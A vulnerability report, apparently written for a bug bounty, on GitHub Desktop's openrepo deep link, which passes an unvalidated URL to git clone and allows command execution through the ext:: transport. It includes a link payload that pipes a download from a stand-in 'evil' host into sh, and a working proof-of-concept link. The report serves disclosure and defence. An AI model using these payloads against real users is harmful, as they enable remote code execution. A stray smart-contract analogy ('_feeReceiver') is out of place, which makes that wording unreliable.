### Title
Arbitrary command execution via unvalidated `ext::` git transport reachable from the `x-github-client://openRepo/` deep link - ([File: app/src/lib/parse-app-url.ts])

### Summary
The "Open in Desktop" custom protocol handler (`x-github-client://openrepo/<url>`) extracts a `url` field from an attacker-controlled deep link and passes it, completely unvalidated, into the Clone Repository dialog as the URL to clone. That value is eventually handed to `git clone` as a positional argument. Git's `ext::<command>` transport, which executes an arbitrary local command as the "remote helper," is permitted by default for "user"-initiated invocations. Because Desktop performs no allow-listing of the clone URL scheme on this path, clicking a single malicious link followed by clicking "Clone" is enough to run an attacker-chosen shell command — the low-level-call analog of sending value to an unvalidated `_feeReceiver`.

### Finding Description
`parseAppURL` in `app/src/lib/parse-app-url.ts` handles the `openrepo` action of the deep link protocols registered in `app/src/main-process/main.ts` (`x-github-client`, `x-github-desktop-auth`, `github-mac`, `github-windows`): [1](#0-0) 

Note that `pr` and `branch` are validated with strict regexes (`testForInvalidChars`, `/^\d+$/`, `/^pr\/\d+$/`), but `url` (`parsedPath`) is returned completely unvalidated — no scheme allow-list, no `parseRemote`/`parseRepositoryIdentifier` check, nothing.

This action flows through `dispatchURLAction` → `openRepositoryFromUrl` → `openOrCloneRepository`, which opens the Clone dialog with `initialURL: url`: [2](#0-1) 

`CloneRepository` seeds its URL tab state directly from `initialURL` with no re-validation: [3](#0-2) 

When the user clicks "Clone", `resolveCloneInfo()` only special-cases `.wiki.git` URLs or GitHub-recognized identifiers; any other string (including `ext::...`) falls through to `return { url }` unmodified: [4](#0-3) 

That URL is then passed straight into `git clone` with no scheme filtering: [5](#0-4) 

Git supports the `ext::<command>` remote helper transport, which spawns `<command>` as a child process to implement the transport, effectively giving the URL string the ability to run an arbitrary command. This transport is not blocked by default for direct/"user" invocations of `git clone` (as opposed to e.g. submodule recursion, which is more restricted) — and Desktop is invoking `git clone` exactly like a direct user command here. Contrast this with the GitHub Enterprise URL entry point, which explicitly restricts to `https:` only: [6](#0-5) 

No equivalent scheme allow-list exists for the deep-link-originated clone URL, so the "call" (i.e., `git clone <attacker-string>`) executes without validating what the "receiver" (transport/command) actually is.

### Impact Explanation
If an attacker gets a user to click a crafted `x-github-client://openrepo/ext::sh%20-c%20"curl%20evil%20|%20sh"` (or Windows equivalent using `ext::cmd /c ...`) link and the user proceeds through the (pre-filled, attacker-controlled) Clone dialog, GitHub Desktop will spawn the attacker's command outside of any repository/git-object sandboxing — this is direct, unprivileged, link-triggered remote code execution on the user's machine, matching the "attacker controls a link/deep link the user clicks → code execution" category explicitly listed as valid impact.

### Likelihood Explanation
Requires the victim to click a link (deep link registration is default for Desktop's own custom protocols) and to click "Clone" in a dialog that is pre-populated with the attacker's exact string, making the flow largely a single-click social-affordance rather than "unprompted unnatural user steps" — the Clone dialog is the app's normal, expected reaction to this deep link, and the URL field is not obviously suspicious to a non-expert user (`ext::` strings can be disguised/obfuscated as part of a longer string, and Desktop does not surface a scheme warning anywhere on this path, unlike the enterprise sign-in flow which explicitly validates `https:`).

### Recommendation
Validate the `url` extracted in `parseAppURL`'s `openrepo` handler (and/or in `CloneRepository`/`cloneImpl`) against an explicit allow-list of safe git transports (e.g., `https:`, `ssh:`, `git:`, or `scp`-style `git@host:` syntax) before ever populating the Clone dialog or invoking `git clone`, mirroring the strict `https:`-only check already used in `app/src/ui/lib/enterprise-validate-url.ts`. Reject/neutralize any URL containing `ext::`, `fd::`, or other command-executing transports.

### Proof of Concept
1. Register/trigger the OS to invoke GitHub Desktop's protocol handler with:
   `x-github-client://openrepo/ext%3A%3Ash%20-c%20%22id%20%3E%20%2Ftmp%2Fpwned%22`
   (URL-encoded form of `ext::sh -c "id > /tmp/pwned"`)
2. Desktop's `handleAppURL` → `parseAppURL` recognizes `openrepo`, and since the pathname length is >1 and no `pr`/`branch` checks fail, returns `{ name: 'open-repository-from-url', url: 'ext::sh -c "id > /tmp/pwned"', ... }` unmodified [1](#0-0) .
3. `openOrCloneRepository` opens the Clone dialog pre-filled with this "URL" [7](#0-6) .
4. User clicks "Clone"; `resolveCloneInfo()` passes the string through unchanged [8](#0-7) ; `clone()` runs `git ... clone ... -- "ext::sh -c \"id > /tmp/pwned\"" <path>` [5](#0-4) .
5. Git's `ext::` transport executes `sh -c "id > /tmp/pwned"` as a child process, confirming arbitrary command execution outside the repository sandbox.

### Citations

**File:** app/src/lib/parse-app-url.ts (L98-125)
```typescript
  if (actionName === 'openrepo') {
    const pr = getQueryStringValue(query, 'pr')
    const branch = getQueryStringValue(query, 'branch')
    const filepath = getQueryStringValue(query, 'filepath')

    if (pr != null) {
      if (!/^\d+$/.test(pr)) {
        return unknown
      }

      // we also expect the branch for a forked PR to be a given ref format
      if (branch != null && !/^pr\/\d+$/.test(branch)) {
        return unknown
      }
    }

    if (branch != null && testForInvalidChars(branch)) {
      return unknown
    }

    return {
      name: 'open-repository-from-url',
      url: parsedPath,
      branch,
      pr,
      filepath,
    }
  }
```

**File:** app/src/ui/dispatcher/dispatcher.ts (L2215-2233)
```typescript
  private async openOrCloneRepository(url: string): Promise<Repository | null> {
    const state = this.appStore.getState()
    const repositories = state.repositories
    const existingRepository = repositories.find(r =>
      this.doesRepositoryMatchUrl(r, url)
    )

    if (existingRepository) {
      return await this.selectRepository(existingRepository)
    }

    return this.appStore._startOpenInDesktop(() => {
      this.changeCloneRepositoriesTab(CloneRepositoryTab.Generic)
      this.showPopup({
        type: PopupType.CloneRepository,
        initialURL: url,
      })
    })
  }
```

**File:** app/src/ui/clone-repository/clone-repository.tsx (L180-215)
```typescript
  public constructor(props: ICloneRepositoryProps) {
    super(props)

    const defaultDirectory = null

    const initialBaseTabState: IBaseTabState = {
      error: null,
      lastParsedIdentifier: null,
      path: defaultDirectory,
      url: this.props.initialURL || '',
      selectedAccount: null,
    }

    this.state = {
      initialPath: defaultDirectory,
      loading: false,
      dotComTabState: {
        kind: 'dotComTabState',
        filterText: '',
        selectedItem: null,
        ...initialBaseTabState,
      },
      enterpriseTabState: {
        kind: 'enterpriseTabState',
        filterText: '',
        selectedItem: null,
        ...initialBaseTabState,
      },
      urlTabState: {
        kind: 'urlTabState',
        ...initialBaseTabState,
      },
    }

    this.initializePath()
  }
```

**File:** app/src/ui/clone-repository/clone-repository.tsx (L732-753)
```typescript
  private async resolveCloneInfo(): Promise<IAPIRepositoryCloneInfo | null> {
    const { url, lastParsedIdentifier } = this.getSelectedTabState()

    if (url.endsWith('.wiki.git')) {
      return { url }
    }

    const account = await findAccountForRemoteURL(url, this.props.accounts)
    if (lastParsedIdentifier !== null && account !== null) {
      const api = API.fromAccount(account)
      const { owner, name } = lastParsedIdentifier
      // Respect the user's preference if they provided an SSH URL
      const protocol = parseRemote(url)?.protocol

      return api.fetchRepositoryCloneInfo(owner, name, protocol).catch(err => {
        log.error(`Failed to look up repository clone info for '${url}'`, err)
        return { url }
      })
    }

    return { url }
  }
```

**File:** app/src/lib/git/clone.ts (L119-126)
```typescript
  if (options.branch) {
    args.push('-b', options.branch)
  }

  args.push('--', url, path)

  await git(args, __dirname, 'clone', opts)
}
```

**File:** app/src/ui/lib/enterprise-validate-url.ts (L14-45)
```typescript
export function validateURL(address: string): string {
  // ensure user has specified text and not just whitespace
  // we will interact with this server so we can be fairly
  // relaxed here about what we accept for the server name
  const trimmed = address.trim()
  if (trimmed.length === 0) {
    const error = new Error('Unknown address')
    error.name = InvalidURLErrorName
    throw error
  }

  let url = URL.parse(trimmed)
  if (!url.host) {
    // E.g., if they user entered 'ghe.io', let's assume they're using https.
    address = `https://${trimmed}`
    url = URL.parse(address)
  }

  if (!url.protocol) {
    const error = new Error('Invalid URL')
    error.name = InvalidURLErrorName
    throw error
  }

  if (url.protocol !== 'https:') {
    const error = new Error('Invalid protocol')
    error.name = InvalidProtocolErrorName
    throw error
  }

  return address
}
```
